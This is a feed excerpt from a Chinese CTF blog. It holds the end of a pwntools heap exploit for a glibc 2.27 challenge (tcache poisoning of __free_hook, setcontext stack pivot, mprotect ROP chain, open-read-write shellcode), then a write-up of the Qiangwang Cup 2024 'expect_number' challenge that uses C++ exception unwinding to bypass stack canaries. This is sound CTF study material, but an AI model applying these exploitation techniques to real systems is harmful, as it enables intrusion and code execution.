class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Input the key: &#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;The result is:\n\t[key,value] = &#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;,&#x27;</span>)</span><br><span class="line">    value=p.recvline()[:-<span class="number">1</span>]</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Success!\n&#x27;</span>)</span><br><span class="line">    <span class="comment"># print(value)</span></span><br><span class="line">    <span class="keyword">return</span> value</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Input the key: &#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Success!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># size取决于我们创建时的输入</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,value</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Input the key: &#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Input the value: &#x27;</span>,value)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Success!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">key = <span class="string">b&#x27;s4cur1ty_p4ssw0rd&#x27;</span></span><br><span class="line">cipher = ARC4.new(key)</span><br><span class="line"><span class="comment"># 4dm1n</span></span><br><span class="line"><span class="comment"># 985da4f8cb37zkj</span></span><br><span class="line"><span class="comment"># s4cur1ty_p4ssw0rd</span></span><br><span class="line"><span class="comment"># glibc 2.27 heap 沙箱no execve</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Input your username:&#x27;</span>, <span class="string">b&#x27;4dm1n&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Input your password:&#x27;</span>, <span class="string">b&#x27;985da4f8cb37zkj&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0-6 填入tcache，7进unsorted,加一个8分割</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">9</span>):</span><br><span class="line">    add(i,(<span class="number">0x290</span>),<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x290</span>)</span><br><span class="line">    <span class="comment">#print(f&quot;alloc &#123;i&#125;&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">8</span>):</span><br><span class="line">    delete(i)</span><br><span class="line">    <span class="comment">#print(f&quot;delete &#123;i&#125;&quot;)</span></span><br><span class="line"></span><br><span class="line">leak_addr=show(<span class="number">7</span>)<span class="comment"># delete会还原内容，而泄露会再过一遍rc4</span></span><br><span class="line">leak_addr=cipher.decrypt(leak_addr)</span><br><span class="line">leak_addr=u64(leak_addr[:<span class="number">8</span>])</span><br><span class="line">main_arena_addr=leak_addr-<span class="number">96</span></span><br><span class="line">libc_base=main_arena_addr-<span class="number">0x3ebca0</span>+<span class="number">0x60</span></span><br><span class="line">libc.address=libc_base</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] libc_base: <span class="subst">&#123;<span class="built_in">hex</span>(libc_base)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 每次重新初始化，这是个流密码不然会继续，草</span></span><br><span class="line">cipher=ARC4.new(key)</span><br><span class="line">leak_addr=show(<span class="number">1</span>)</span><br><span class="line">leak_addr=cipher.decrypt(leak_addr)</span><br><span class="line"><span class="built_in">print</span>(leak_addr)</span><br><span class="line">leak_addr=u64(leak_addr[:<span class="number">8</span>])</span><br><span class="line">heap_base=leak_addr-<span class="number">0x1670</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] heap_base: <span class="subst">&#123;<span class="built_in">hex</span>(heap_base)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># chunks : $rebase(0x203080)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 开始</span></span><br><span class="line">free_hook=libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"><span class="comment"># malloc_hook=libc_base + 0x3ebc30</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] free_hook: &quot;</span>,<span class="built_in">hex</span>(free_hook))</span><br><span class="line">gadget=libc.symbols[<span class="string">&#x27;setcontext&#x27;</span>]+<span class="number">53</span></span><br><span class="line"><span class="comment"># open_addr=libc.symbols[&#x27;open&#x27;]</span></span><br><span class="line"><span class="comment"># read_addr=libc.symbols[&#x27;read&#x27;]</span></span><br><span class="line"><span class="comment"># write_addr=libc.symbols[&#x27;write&#x27;]</span></span><br><span class="line"><span class="comment"># print(&quot;[+] orw: &quot;,hex(open_addr),hex(read_addr),hex(write_addr))</span></span><br><span class="line">mprotect=libc.symbols[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x40</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span>) <span class="comment"># 把tcache里开始的0x50拿出来</span></span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line">cipher=ARC4.new(key)</span><br><span class="line">payload1=p64(free_hook)</span><br><span class="line">payload1=cipher.encrypt(payload1)</span><br><span class="line">edit(<span class="number">9</span>,payload1)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x40</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span>) <span class="comment"># 下一个是freehook</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># fake_stack=heap_base+0x1670</span></span><br><span class="line">pop_rdi=libc_base+<span class="number">0x2164f</span></span><br><span class="line">pop_rsi=libc_base+<span class="number">0x23a6a</span></span><br><span class="line">pop_rdx=libc_base+<span class="number">0x1b96</span></span><br><span class="line">ret = libc_base + <span class="number">0x8aa</span></span><br><span class="line">buffer=heap_base+<span class="number">0x3000</span> <span class="comment"># 随便写的</span></span><br><span class="line">shellcode = (</span><br><span class="line">    shellcraft.<span class="built_in">open</span>(<span class="string">&quot;./flag&quot;</span>)</span><br><span class="line">    + shellcraft.read(<span class="string">&quot;rax&quot;</span>, buffer, <span class="number">0x50</span>)</span><br><span class="line">    + shellcraft.write(<span class="number">1</span>, buffer, <span class="number">0x50</span>)</span><br><span class="line">)</span><br><span class="line">shellcode=<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x10</span>+p64(ret)+p64(pop_rdi)+p64(heap_base)+p64(pop_rsi)+p64(<span class="number">0x7000</span>)+p64(pop_rdx)+p64(<span class="number">0x7</span>)+p64(mprotect)+p64(heap_base+<span class="number">0x1670</span>+<span class="number">0x58</span>)+asm(shellcode)</span><br><span class="line"><span class="comment"># fake_stack=b&#x27;\x00&#x27;*0x10</span></span><br><span class="line"><span class="comment"># fake_stack+=p64(pop_rdi)+p64(heap_base+0x24c8)+p64(pop_rsi)+p64(0)+p64(libc_base+0x10fbf0)</span></span><br><span class="line"><span class="comment"># fake_stack+=p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(heap_base)+p64(pop_rdx)+p64(0x40)+p64(libc_base+0x110020)</span></span><br><span class="line"><span class="comment"># fake_stack+=p64(pop_rdi)+p64(1)+p64(libc_base+0x1100f0)</span></span><br><span class="line"><span class="comment"># fake_stack+=b&#x27;flag&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># tmd有点看运气，地址随机里面有0a就gg</span></span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b free&#x27;</span>)</span><br><span class="line"><span class="comment"># free1 将栈迁移到0上</span></span><br><span class="line"><span class="comment"># 还有一个问题就是迁移时候的指令状态</span></span><br><span class="line">payload2=<span class="string">b&#x27;z&#x27;</span>*<span class="number">0xa0</span>+p64(heap_base+<span class="number">0x1670</span>+<span class="number">0x10</span>)+p64(ret)</span><br><span class="line"><span class="comment"># 读到0xa会断，所以free掉让它变明文？？？</span></span><br><span class="line"></span><br><span class="line">cipher=ARC4.new(key)</span><br><span class="line">edit(<span class="number">1</span>,payload2)<span class="comment">#这个能通</span></span><br><span class="line"></span><br><span class="line">cipher=ARC4.new(key)</span><br><span class="line">edit(<span class="number">0</span>,shellcode)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">cipher=ARC4.new(key)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x40</span>,cipher.encrypt(p64(gadget))) </span><br><span class="line"><span class="comment">#free_hook写入了gadget，下次free会将栈迁移到free的chunk+0xa0写的内容</span></span><br><span class="line"><span class="comment"># 到这都成功了</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;题目分析&lt;/h1&gt;
&lt;p&gt;Glibc2.27，64位保护全开，沙箱ban掉了execve和execveat，打orw。&lt;/p&gt;
&lt;h2 id=&quot;爆破用户名和密码&quot;&gt;爆破用户名和密码&lt;/h2&gt;
&lt;p&gt;这个程序上来先在远程打开了用户名和密码的文件要我们输入，找了半天没找到题目</summary>
      
    
    
    
    <category term="pwn" scheme="https://zjw1nd.github.io/categories/pwn/"/>
    
    
    <category term="pwn" scheme="https://zjw1nd.github.io/tags/pwn/"/>
    
    <category term="wp" scheme="https://zjw1nd.github.io/tags/wp/"/>
    
    <category term="heap" scheme="https://zjw1nd.github.io/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>CHOP——强网杯2024expect_number wp</title>
    <link href="https://zjw1nd.github.io/2024/11/10/CHOP%E2%80%94%E2%80%94%E5%BC%BA%E7%BD%91%E6%9D%AF2024expect-number-wp/"/>
    <id>https://zjw1nd.github.io/2024/11/10/CHOP%E2%80%94%E2%80%94%E5%BC%BA%E7%BD%91%E6%9D%AF2024expect-number-wp/</id>
    <published>2024-11-10T15:27:20.000Z</published>
    <updated>2024-11-20T12:42:03.374Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>参考自<a href="https://xz.aliyun.com/t/12967">溢出漏洞在异常处理中的攻击利用手法-上</a>和<a href="https://xz.aliyun.com/t/12994">溢出漏洞在异常处理中的攻击利用手法-下</a></p></blockquote><h1>简单了解下C++异常处理</h1><p>C++有这样的关键字，支持执行异常的处理：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="built_in">do_sth</span>();</span><br><span class="line">    <span class="keyword">throw</span> exception;</span><br><span class="line">    <span class="built_in">nothing_will_happen_here</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">catch</span>(exception typeA)&#123;</span><br><span class="line">    <span class="built_in">my_handler</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">catch</span>(exception typeB)&#123;</span><br><span class="line">    <span class="built_in">my_handler2</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关于C++的异常处理：</p><blockquote><p><a href="https://www.cnblogs.com/sgawscd/p/13870406.html">https://www.cnblogs.com/sgawscd/p/13870406.html</a><br><a href="https://blog.csdn.net/GrayOnDream/article/details/138469330">https://blog.csdn.net/GrayOnDream/article/details/138469330</a>  &lt;-- 具体的细节参考这一篇即可</p></blockquote><p>简单的来说，任何函数都可以通过throw关键字抛出异常。对于可能抛出异常的代码，要用try去包裹。而后续需要用catch去捕获异常。<br>catch可以在后面添加类型来声明catch内处理的异常类型。触发throw后，在开发者的视角下，会从抛出异常的try块向外匹配第一个类型合适的catch块，然后程序会将控制权移交到catch块中的异常处理代码。此时throw后面的代码全部都不会执行，因此这种控制流的强行跳转给了我们利用的机会。这种对于catch逐层向上的匹配机制，叫做<strong>栈展开(Stack Unwind)</strong>。</p><h2 id="libstdc-的异常处理实现">libstdc++的异常处理实现</h2><p>下面以linux的libstdc++的实现为例大概看一下throw之后发生了什么</p><p>首先，当使用throw关键字的时候，编译器会先用<code>__cxa_allocate_exception</code>分配一些处理所需要的对象空间。然后程序会调用<code>__cxa_throw()</code>抛出异常，最后核心函数会进入<code>_Unwind_RaiseException()</code>。再后面就是gdb跟进困难的内容了，具体细节不再赘述。不过会用Unwind以及程序中<code>eh_frame</code>节中相关的信息去对堆栈进行回溯。</p><p>既然会回溯找代码，那么一定会设计到堆栈中pc的恢复，也就是返回地址。如果我们能够覆盖try块的返回地址然后去throw，就可能能劫持到控制流到其他的catch块（不是其他catch块的话，回溯到main发现没有catch代码，会被terminate退出）</p><p>另外，由于throw后面的内容其实都根本不会执行，所以这个操作能够绕过canary（check根本不执行，覆盖了canary也没事），这是比较神奇的一点。</p><h1>对于这道题目</h1><h2 id="流程分析">流程分析</h2><p>这一部分我们不多讲，程序是通过一个以1为种子的伪随机数序列，然后通过用户输入0 1 2进行加，乘，除操作。程序提供了一个<br>system gift（但是没用）。</p><p>指针初始化在initarray，程序有4个类，一个基类和3个派生（猜测这是为了让它们函数虚表的地址相邻），其中两个派生类一个是退出一个是存在溢出的漏洞函数。5010-&gt;5520-&gt;vtable-&gt;func</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">data.rel.ro:<span class="number">0000000000004</span>C20 ; `vtable <span class="keyword">for</span><span class="number">&#x27;</span>Derived3</span><br><span class="line">.data.rel.ro:<span class="number">0000000000004</span>C20 _ZTV8Derived3   dq <span class="number">0</span>                    ; offset to this</span><br><span class="line">.data.rel.ro:<span class="number">0000000000004</span>C28                 dq offset _ZTI8Derived3 ; `typeinfo <span class="keyword">for</span><span class="number">&#x27;</span>Derived3</span><br><span class="line">.data.rel.ro:<span class="number">0000000000004</span>C30 off_4C30        dq offset display_d3    ; DATA XREF: set_d3_display+<span class="number">1</span>C↑o</span><br><span class="line">.data.rel.ro:<span class="number">0000000000004</span>C38 ; `vtable <span class="keyword">for</span><span class="number">&#x27;</span>Derived2</span><br><span class="line">.data.rel.ro:<span class="number">0000000000004</span>C38 _ZTV8Derived2   dq <span class="number">0</span>                    ; offset to this</span><br><span class="line">.data.rel.ro:<span class="number">0000000000004</span>C40                 dq offset _ZTI8Derived2 ; `typeinfo <span class="keyword">for</span><span class="number">&#x27;</span>Derived2</span><br><span class="line">.data.rel.ro:<span class="number">0000000000004</span>C48 quit_ptr        dq offset quit          ; DATA XREF: set_quit+<span class="number">1</span>C↑o</span><br><span class="line">.data.rel.ro:<span class="number">0000000000004</span>C50 ; `vtable <span class="keyword">for</span><span class="number">&#x27;</span>Derived</span><br><span class="line">.data.rel.ro:<span class="number">0000000000004</span>C50 _ZTV7Derived    dq <span class="number">0</span>                    ; offset to this</span><br><span class="line">.data.rel.ro:<span class="number">0000000000004</span>C58                 dq offset _ZTI7Derived  ; `typeinfo <span class="keyword">for</span><span class="number">&#x27;</span>Derived</span><br><span class="line">.data.rel.ro:<span class="number">0000000000004</span>C60 vuln_off        dq offset vuln          ; DATA XREF: init_game+<span class="number">1</span>C↑o</span><br><span class="line">.data.rel.ro:<span class="number">0000000000004</span>C68 ; `vtable <span class="keyword">for</span><span class="number">&#x27;B</span>ase</span><br><span class="line">.data.rel.ro:<span class="number">0000000000004</span>C68 _ZTV4Base       dq <span class="number">0</span>                    ; offset to this</span><br><span class="line">.data.rel.ro:<span class="number">0000000000004</span>C70                 dq offset _ZTI4Base     ; `typeinfo <span class="keyword">for</span><span class="number">&#x27;B</span>ase</span><br><span class="line">.data.rel.ro:<span class="number">0000000000004</span>C78 base_display_ptr dq offset base_display ; DATA XREF: set_base_display_ptr+C↑o</span><br><span class="line">.data.rel.ro:<span class="number">0000000000004</span>C80                 public _ZTISt13runtime_error ; weak</span><br></pre></td></tr></table></figure><p>5520正好在输入结构的+288位置，重复288次输入没有考虑结构体头的12字节，可以溢出12字节。但是每次写入之后前一个就会被覆盖为上次操作我们实际上只能溢出1个字节。恰巧的是，1个就够了，50-&gt;60即可总之我们就利用程序的逻辑和一个offbyone的漏洞将正常退出的指针劫持到了虚表里另一个派生类的漏洞函数上。</p><p>我们重点关注这个有栈溢出的后门：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="built_in">std</span>::runtime_error *exception; <span class="comment">// rbx</span></span><br><span class="line">  _BYTE buf[<span class="number">8</span>]; <span class="comment">// [rsp+20h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v0 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;();</span><br><span class="line">  <span class="built_in">std</span>::ostream::operator&lt;&lt;(v0, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  <span class="keyword">if</span> ( read(<span class="number">0</span>, buf, <span class="number">0x30</span>uLL) &gt; <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    exception = (<span class="built_in">std</span>::runtime_error *)__cxa_allocate_exception(<span class="number">0x10</span>uLL);</span><br><span class="line">    <span class="built_in">std</span>::runtime_error::runtime_error(exception, <span class="string">&quot;Input too long&quot;</span>);</span><br><span class="line">    __cxa_throw(exception,</span><br><span class="line">    (<span class="keyword">struct</span> type_info *)&amp;`typeinfo forstd`::runtime_error,</span><br><span class="line">    (<span class="type">void</span> (*)(<span class="type">void</span> *))&amp;<span class="built_in">std</span>::runtime_error::~runtime_error);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v4 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同时程序里还有这样的catch块：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">00000000000024E1</span> ; __unwind &#123; <span class="comment">// __gxx_personality_v0</span></span><br><span class="line">.text:<span class="number">00000000000024E1</span>                 endbr64</span><br><span class="line">.text:<span class="number">00000000000024E5</span>                 push    rbp</span><br><span class="line">.text:<span class="number">00000000000024E6</span>                 mov     rbp, rsp</span><br><span class="line">.text:<span class="number">00000000000024E9</span>                 push    rbx</span><br><span class="line">.text:<span class="number">00000000000024</span>EA                 sub     rsp, <span class="number">28</span>h</span><br><span class="line">.text:<span class="number">00000000000024</span>EE                 mov     rax, fs:<span class="number">28</span>h</span><br><span class="line">.text:<span class="number">00000000000024F</span>7                 mov     [rbp+var_18], rax</span><br><span class="line">.text:<span class="number">00000000000024F</span>B                 xor     eax, eax</span><br><span class="line">.text:<span class="number">00000000000024F</span>D                 mov     [rbp+var_24], <span class="number">0</span></span><br><span class="line">.text:<span class="number">0000000000002504</span>                 lea     rax, [rbp+var_24]</span><br><span class="line">.text:<span class="number">0000000000002508</span>                 mov     rsi, rax</span><br><span class="line">.text:<span class="number">000000000000250B</span>                 lea     rax, _ZSt3cin   ; <span class="built_in">std</span>::<span class="built_in">cin</span></span><br><span class="line">.text:<span class="number">0000000000002512</span>                 mov     rdi, rax</span><br><span class="line">.text:<span class="number">0000000000002515</span> ;   try &#123;</span><br><span class="line">.text:<span class="number">0000000000002515</span>                 call    __ZNSirsERi     ; <span class="built_in">std</span>::istream::operator&gt;&gt;(<span class="type">int</span> &amp;)</span><br><span class="line">.text:<span class="number">0000000000002515</span> ;   &#125; <span class="comment">// starts at 2515</span></span><br><span class="line">.text:<span class="number">000000000000251</span>A                 mov     eax, [rbp+var_24]</span><br><span class="line">.text:<span class="number">000000000000251</span>D                 jmp     <span class="type">short</span> loc_256A</span><br><span class="line">.text:<span class="number">000000000000251F</span> ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">000000000000251F</span> ;   catch(<span class="built_in">std</span>::runtime_error) <span class="comment">// owned by 2515</span></span><br><span class="line">.text:<span class="number">000000000000251F</span>                 endbr64</span><br><span class="line">.text:<span class="number">0000000000002523</span>                 cmp     rdx, <span class="number">1</span></span><br><span class="line">.text:<span class="number">0000000000002527</span>                 jz      <span class="type">short</span> loc_2531</span><br><span class="line">.text:<span class="number">0000000000002529</span>                 mov     rdi, rax        ; <span class="class"><span class="keyword">struct</span> _<span class="title">Unwind_Exception</span> *</span></span><br><span class="line"><span class="class">.<span class="title">text</span>:</span><span class="number">000000000000252</span>C                 call    __Unwind_Resume</span><br><span class="line">.text:<span class="number">0000000000002531</span> ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">0000000000002531</span></span><br><span class="line">.text:<span class="number">0000000000002531</span> loc_2531:                               ; CODE XREF: <span class="built_in">cin</span>+<span class="number">46</span>↑j</span><br><span class="line">.text:<span class="number">0000000000002531</span>                 mov     rdi, rax        ; <span class="type">void</span> *</span><br><span class="line">.text:<span class="number">0000000000002534</span>                 call    ___cxa_begin_catch</span><br><span class="line">.text:<span class="number">0000000000002539</span>                 mov     [rbp+var_20], rax</span><br><span class="line">.text:<span class="number">000000000000253</span>D                 lea     rax, command    ; <span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line">.text:<span class="number">0000000000002544</span>                 mov     rdi, rax        ; command</span><br><span class="line">.text:<span class="number">0000000000002547</span> ;   try &#123;</span><br><span class="line">.text:<span class="number">0000000000002547</span>                 call    _system  ; ------&gt; system</span><br><span class="line">.text:<span class="number">0000000000002547</span> ;   &#125; <span class="comment">// starts at 2547</span></span><br><span class="line">.text:<span class="number">000000000000254</span>C                 call    ___cxa_end_catch</span><br><span class="line">.text:<span class="number">0000000000002551</span>                 jmp     <span class="type">short</span> loc_256A</span><br><span class="line">.text:<span class="number">0000000000002553</span> ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">0000000000002553</span> ;   cleanup() <span class="comment">// owned by 2547</span></span><br><span class="line">.text:<span class="number">0000000000002553</span>                 endbr64</span><br><span class="line">.text:<span class="number">0000000000002557</span>                 mov     rbx, rax</span><br><span class="line">.text:<span class="number">000000000000255</span>A                 call    ___cxa_end_catch</span><br><span class="line">.text:<span class="number">000000000000255F</span>                 mov     rax, rbx</span><br><span class="line">.text:<span class="number">0000000000002562</span>                 mov     rdi, rax        ; <span class="class"><span class="keyword">struct</span> _<span class="title">Unwind_Exception</span> *</span></span><br><span class="line"><span class="class">.<span class="title">text</span>:</span><span class="number">0000000000002565</span>                 call    __Unwind_Resume</span><br><span class="line">.text:<span class="number">000000000000256</span>A ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">000000000000256</span>A</span><br><span class="line">.text:<span class="number">000000000000256</span>A loc_256A:                               ; CODE XREF: <span class="built_in">cin</span>+<span class="number">3</span>C↑j</span><br><span class="line">.text:<span class="number">000000000000256</span>A                                         ; <span class="built_in">cin</span>+<span class="number">70</span>↑j</span><br><span class="line">.text:<span class="number">000000000000256</span>A                 mov     rdx, [rbp+var_18]</span><br><span class="line">.text:<span class="number">000000000000256</span>E                 sub     rdx, fs:<span class="number">28</span>h</span><br><span class="line">.text:<span class="number">0000000000002577</span>                 jz      <span class="type">short</span> loc_257E</span><br><span class="line">.text:<span class="number">0000000000002579</span>                 call    ___stack_chk_fail</span><br><span class="line">.text:<span class="number">000000000000257</span>E ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">000000000000257</span>E</span><br><span class="line">.text:<span class="number">000000000000257</span>E loc_257E:                               ; CODE XREF: <span class="built_in">cin</span>+<span class="number">96</span>↑j</span><br><span class="line">.text:<span class="number">000000000000257</span>E                 mov     rbx, [rbp+var_8]</span><br><span class="line">.text:<span class="number">0000000000002582</span>                 leave</span><br><span class="line">.text:<span class="number">0000000000002583</span>                 retn</span><br><span class="line">.text:<span class="number">0000000000002583</span> ; &#125; <span class="comment">// starts at 24E1</span></span><br><span class="line">.text:<span class="number">0000000000002583</span> <span class="built_in">cin</span>             endp</span><br></pre></td></tr></table></figure><p>想办法让程序返回到这就可以了。本着实践大于理论的原则比赛的时候试了好久（其实也就一小时可能）都没成，结果是要返回到0x251a，我就低了5个字节。</p><p>事实上是，将返回地址填成我们想要跳转到的catch块，rbp的值只要是一个可读写的地址就行了，防止中间汇编rbp寻址的时候sigsegv。</p><h1>几个小问题</h1><h2 id="程序怎么识别的try-catch块？">程序怎么识别的try-catch块？</h2><p>编译器为程序生成了一个异常处理表<code>.gcc_except_table</code>，作为一个单独的节存放相关的信息。</p><h2 id="rbp的作用？">rbp的作用？</h2><p>如果在handler中有<code>leave;ret</code>的gadget，我们理论上在溢出后控制rbp就能劫持控制流。其他情况下一般要注意rbp地址有效。</p><h2 id="注意：">注意：</h2><p>这个ret地址的范围并不精确，尽量要写到带有catch的函数的try范围内，如果不成功一定要换附近地址多试几次，血泪教训。</p><h1>什么是CHOP?</h1><p>CHOP是Catch Handler Oriented Programming。出自一篇论文，更多的可以去看开篇提到的blog。总之这玩意的思想就是：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __cxa_call_unexpected (<span class="type">void</span> *exc_obj_in) &#123;</span><br><span class="line"> xh_terminate_handler = xh-&gt;terminateHandler;</span><br><span class="line"> <span class="keyword">try</span> &#123; <span class="comment">/* ... */</span> &#125;</span><br><span class="line"> <span class="built_in">catch</span> (...) &#123;</span><br><span class="line"> __terminate(xh_terminate_handler);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __terminate (<span class="built_in">void</span> (*handler)()) <span class="keyword">throw</span> () &#123;</span><br><span class="line"> <span class="comment">/* ... */</span></span><br><span class="line"> <span class="built_in">handler</span>();</span><br><span class="line"> std::<span class="built_in">abort</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有函数指针的地方就有pwn，libstdc++中有这样一个调用指针的地方。如果异常处理前存在栈溢出能劫持返回地址，我们控制好xh_terminate_handler这一局部变量后返回到<code>__cxa_call_unexpected</code>的catch块就能实现控制流劫持。通过这个Golden Gadget，我们可以将有canary的栈溢出变成无canary的栈溢出，只需要以这个catch做跳板。</p><p>版本更高的libc也只是调用路径更复杂了。</p><p>摸了</p>]]></content>
    
